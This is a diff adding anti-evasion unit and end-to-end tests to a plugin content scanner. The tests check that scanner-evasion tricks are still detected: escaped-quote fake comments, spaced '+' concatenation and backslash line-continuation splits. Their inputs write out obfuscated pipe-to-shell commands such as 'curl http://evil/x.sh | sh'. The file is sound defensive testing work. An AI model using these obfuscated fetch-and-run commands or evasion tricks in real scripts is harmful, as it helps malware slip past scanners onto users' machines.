@@ -21,6 +21,7 @@ import {
   parseAllowlist,
   isWaived,
   concatCollapse,
+  normalizeLines,
   fileClass,
   GRADE,
 } from './scan-synced-content.mjs';
@@ -252,6 +253,61 @@ test('anti-evasion: commented-out payload does NOT fire (comment stripped)', () 
     'plugins/community/good/x.sh',
   );
   assert.ok(!hasRefuse(f), `a commented example must not REFUSE, got ${JSON.stringify(ids(f))}`);
+});
+
+// ── Tokenizer anti-evasion (red-team, tokenizer layer) ──────────────────────
+// Three bypasses the raw-view-less line scanner had: an escaped quote forging a
+// fake comment, `+`-concatenation split with spaces, and a token split across a
+// backslash line-continuation. Each fix gets a unit (tokenizer) + an e2e (scan).
+
+test('anti-evasion: an escaped quote does not forge a fake comment cut (shell + js)', () => {
+  // shell: `\"` keeps us inside the double-quoted string, so the later `# ` is
+  // NOT a comment and the pipe-to-shell payload survives stripping.
+  const sh = normalizeLines('echo "x \\" # " && curl u | sh\n', 'shell');
+  assert.match(sh[0].text, /curl u \| sh/, `shell payload must survive, got: ${sh[0].text}`);
+  // js: `\"` keeps us inside the string, so the trailing `//` is not a comment.
+  const js = normalizeLines('var s = "a\\"//x"; runShell("curl http://e|sh");\n', 'js');
+  assert.match(js[0].text, /curl http:\/\/e\|sh/, `js payload must survive, got: ${js[0].text}`);
+});
+
+test('anti-evasion: escaped-quote fake comment does not hide a pipe-to-shell (script, e2e)', () => {
+  const f = scanContent(
+    '#!/bin/sh\necho "x \\" # " && curl http://evil/x.sh | sh\n',
+    'plugins/community/evil/x.sh',
+  );
+  assert.ok(
+    hasRefuse(f),
+    `escaped-quote comment bypass must REFUSE, got ${JSON.stringify(ids(f))}`,
+  );
+});
+
+test('anti-evasion: concatCollapse reveals a spaced "cur" + "l" → curl, keeps other spaces', () => {
+  assert.equal(concatCollapse('"cur" + "l"'), 'curl');
+  assert.equal(concatCollapse('a + b'), 'ab');
+  // regression: spaces unrelated to a `+` are preserved so `\s+` patterns match.
+  assert.equal(concatCollapse('curl -sSL x | sh'), 'curl -sSL x | sh');
+});
+
+test('anti-evasion: spaced-+ concatenation reveals a split curl in a pipe-to-shell (script, e2e)', () => {
+  const f = scanContent(
+    '#!/bin/sh\n"cur" + "l" http://e/x.sh | sh\n',
+    'plugins/community/evil/x.sh',
+  );
+  assert.ok(hasRefuse(f), `spaced-+ split token must REFUSE, got ${JSON.stringify(ids(f))}`);
+});
+
+test('anti-evasion: a backslash line-continuation joins with no space (cu\\<NL>rl → curl)', () => {
+  const logical = normalizeLines('cu\\\nrl http://e/x.sh | sh\n', 'shell');
+  assert.match(
+    logical[0].text,
+    /\bcurl\b/,
+    `continuation must join to curl, got: ${logical[0].text}`,
+  );
+});
+
+test('anti-evasion: curl split across a backslash-continuation still REFUSEs (script, e2e)', () => {
+  const f = scanContent('#!/bin/sh\ncu\\\nrl http://e/x.sh | sh\n', 'plugins/community/evil/x.sh');
+  assert.ok(hasRefuse(f), `continuation-split curl must REFUSE, got ${JSON.stringify(ids(f))}`);
 });
 
 // ─────────────────────────────────────────────────────────────────────────────
